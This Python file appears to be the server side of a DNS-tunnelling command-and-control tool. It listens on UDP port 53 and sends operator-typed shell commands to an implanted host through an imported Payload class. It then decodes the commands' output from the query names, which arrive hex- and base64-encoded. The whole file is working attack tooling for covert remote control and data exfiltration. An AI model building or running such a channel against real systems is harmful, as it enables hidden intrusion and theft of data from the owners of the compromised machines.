from datetime import datetime
import socket
import base64
from payload import Payload

class DNSServer:
    def __init__(self,port,ip):
        self.port = port
        self.ip = ip

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((self.ip,self.port))
        print("UDP Server Started Listening")
        commandRan = False
        while 1:
            req, address = sock.recvfrom(512) #start listening
            printWithTime("UDP", f"Received {len(req)} bytes from {address}")
            print(req)
            if commandRan:
                dataList = list(req)
                newDataList = list()
                found = False
                count = 0
                for i in dataList:
                    if i == 47:
                        found = True
                        count += 1
                        if count == 2:
                            break
                    elif found:
                        newDataList.append(i)
                bytesnewDataList = bytearray(newDataList)
                hex2 = bytesnewDataList.decode("ascii")
                b = bytes.fromhex(hex2).decode("ascii")
                base64_bytes = b.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                commandOutput = message_bytes.decode('ascii') 
                print("Output of " + command + ":" + commandOutput)       
                commandRan = False
            command = input("Enter a command:")
            p = Payload("192.168.7.202")
            p.payload(sock,req,command)
            commandRan = True

def printWithTime(head, message):
        curr_time = datetime.now().strftime("%H:%M:%S.%f")
        print(f"[{head}] [{curr_time[:-3]}]", message)

def main():
    dns = DNSServer(53,"192.168.7.168")
    dns.start()

main()